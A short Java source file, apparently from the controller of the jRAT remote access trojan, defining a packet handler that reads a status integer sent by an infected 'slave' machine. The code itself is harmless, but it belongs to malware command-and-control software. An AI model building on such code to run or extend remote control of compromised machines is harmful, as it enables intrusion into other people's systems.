package se.jrat.client.packets.incoming;

import java.io.DataInputStream;

import se.jrat.client.Slave;

public class Packet2Status extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		int status = dis.readInt();
		slave.setStatus(status);
		
	}
}
